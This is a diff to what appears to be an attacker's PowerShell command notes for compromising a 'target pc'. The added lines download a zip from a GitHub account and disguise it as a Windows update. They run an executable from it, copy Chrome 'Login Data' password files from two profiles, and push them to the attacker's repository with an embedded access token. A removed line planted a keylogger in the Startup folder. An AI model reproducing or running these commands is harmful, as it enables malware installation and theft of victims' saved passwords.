@@ -26,4 +26,40 @@ available disk show
 ======================================= 
 downloading keylooger to target pc
 ======================================
-  Invoke-WebRequest -Uri 'https://github.com/HAXORK8880/commands/blob/main/python.zip?raw=true' -OutFile $ENV:UserProfile'\AppData\Roaming\Microsoft\Windows\Start    Menu\Programs\Startup\python.zip
+  Invoke-WebRequest -Uri 'https://github.com/HAXORK8880/commands/blob/main/security.zip?raw=true' -OutFile $ENV:UserProfile'\WindowsUpdate\Windows32.zip'
+ 
+ =======================
+ Delete folder or items
+ =======================
+  Remove-Item Windows32 -Force  -Recurse -ErrorAction SilentlyContinue
+  
+ ===================================== 
+ Setup working directory to target
+ =====================================
+ cd $ENV:UserProfile'
+ mkdir WindowsUpdate
+ cd WindowsUpdate
+ mkdir security
+ git init
+ git remote add origin https://github.com/HAXORK8880/UploadServer.git
+ Invoke-WebRequest -Uri 'https://github.com/HAXORK8880/commands/blob/main/security.zip?raw=true' -OutFile $ENV:UserProfile'\WindowsUpdate\Windows32.zip'
+ Expand-Archive Windows32.zip
+ cd Windows32
+ cd graphics
+ ./regedit.exe
+ 
+ =============================================
+ For collection password to working directory
+ =============================================
+ cd security
+ mkdir profile
+ Copy-Item -Path $ENV:UserProfile'\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Destination $ENV:UserProfile'\WindowsUpdate\Windows32\security'
+ Copy-Item -Path $ENV:UserProfile'\AppData\Local\Google\Chrome\User Data\Profile 3\Login Data' -Destination $ENV:UserProfile'\WindowsUpdate\Windows32\security\profile'
+ 
+ =====================
+ git push from target
+ ====================
+ git add .
+ git commit -m "from target machine"
+ git remote add origin https://github.com/HAXORK8880/UploadServer.git
+ git push https://HAXORK8880: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@github.com/HAXORK8880/UploadServer.git
